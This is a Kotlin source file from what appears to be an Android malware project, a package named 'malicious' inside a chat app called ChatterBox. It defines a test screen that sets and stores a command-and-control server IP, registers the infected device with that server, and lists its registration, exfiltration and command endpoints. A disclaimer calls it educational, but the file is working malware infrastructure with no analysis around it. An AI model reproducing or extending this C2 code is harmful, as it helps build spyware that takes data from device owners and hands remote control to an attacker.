package com.example.ChatterBox.malicious

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.R
import java.io.File
import java.io.FileOutputStream

/**
 * A test activity to verify and update the C2 server connection.
 * 
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class TestC2Activity : AppCompatActivity() {
    private lateinit var c2Client: C2Client
    private lateinit var ipEditText: EditText
    private lateinit var statusTextView: TextView
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_test_c2)
        
        // Initialize the C2 configuration
        C2Config.initialize(this)
        
        // Set up UI components
        ipEditText = findViewById(R.id.ip_edit_text)
        val updateButton: Button = findViewById(R.id.update_ip_button)
        val testButton: Button = findViewById(R.id.test_connection_button)
        statusTextView = findViewById(R.id.status_text_view)
        
        // Set the current IP in the EditText
        ipEditText.setText(C2Config.getServerIp())
        
        // Initialize C2 client
        c2Client = C2Client(this)
        
        // Set up button click listeners
        updateButton.setOnClickListener {
            updateC2ServerIP()
        }
        
        testButton.setOnClickListener {
            testC2Connection()
        }
        
        // Update the status text
        updateStatusText()
    }
    
    private fun updateC2ServerIP() {
        val newIp = ipEditText.text.toString().trim()
        
        if (newIp.isEmpty()) {
            Toast.makeText(this, "Please enter a valid IP address", Toast.LENGTH_SHORT).show()
            return
        }
        
        try {
            // Update the IP in the C2Config with context for persistence
            C2Config.updateServerIp(newIp, this)
            
            // Update status and show success message
            updateStatusText()
            Toast.makeText(this, "C2 server IP updated successfully", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e("TestC2Activity", "Error updating C2 server IP", e)
            Toast.makeText(this, "Error updating IP: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }
    
    private fun testC2Connection() {
        statusTextView.text = "Testing connection to ${C2Config.getServerUrl()}..."
        
        // Register with the C2 server (this will test the connection)
        c2Client.registerDevice()
        
        // Show a toast indicating that the test has started
        Toast.makeText(this, "Testing connection to C2 server...", Toast.LENGTH_SHORT).show()
        
        // The actual result will be displayed as a notification by the C2Client
    }
    
    private fun updateStatusText() {
        statusTextView.text = """
            C2 Server Status:
            
            Current IP: ${C2Config.getServerIp()}
            Server URL: ${C2Config.getServerUrl()}
            Registration Endpoint: ${C2Config.getRegistrationEndpoint()}
            Exfiltration Endpoint: ${C2Config.getExfiltrationEndpoint()}
            Command Endpoint: ${C2Config.getCommandEndpoint()}
        """.trimIndent()
    }
}